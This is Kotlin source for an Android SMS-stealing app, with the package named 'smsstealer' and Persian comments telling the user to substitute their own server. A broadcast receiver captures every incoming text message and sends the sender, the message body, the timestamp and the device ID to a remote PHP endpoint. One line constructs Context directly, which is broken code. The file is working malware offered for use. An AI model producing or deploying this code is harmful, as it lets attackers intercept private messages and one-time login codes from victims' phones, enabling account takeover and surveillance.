package com.dark.smsstealer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class SmsReceiver: BroadcastReceiver() {
 private val SERVER_URL = "https://your-server.com/sms_receiver.php" // آدرس سرور خود را جایگزین کنید
 private val client = OkHttpClient()

 override fun onReceive(context: Context, intent: Intent) {
 if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
 val bundle: Bundle? = intent.extras
 if (bundle != null) {
 val pdus = bundle["pdus"] as Array<*>
 for (pdu in pdus) {
 val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
 val sender = smsMessage.originatingAddress
 val message = smsMessage.messageBody
 val timestamp = smsMessage.timestampMillis

 // ارسال پیامک به سرور
 sendSmsToServer(sender, message, timestamp)
 }
 }
 }
 }

 private fun sendSmsToServer(sender: String?, message: String?, timestamp: Long) {
 val json = """
 {
 "sender": "$sender",
 "message": "$message",
 "timestamp": $timestamp,
 "device_id": "${android.provider.Settings.Secure.getString(
 android.content.Context().contentResolver,
 android.provider.Settings.Secure.ANDROID_ID
 )}"
 }
 """.trimIndent()

 val requestBody = json.toRequestBody("application/json".toMediaType())
 val request = Request.Builder()
.url(SERVER_URL)
.post(requestBody)
.build()

 client.newCall(request).enqueue(object: Callback {
 override fun onFailure(call: Call, e: IOException) {
 Log.e("SmsStealer", "Failed to send SMS: ${e.message}")
 }

 override fun onResponse(call: Call, response: Response) {
 Log.i("SmsStealer", "SMS sent to server: ${response.code}")
 }
 })
 }
}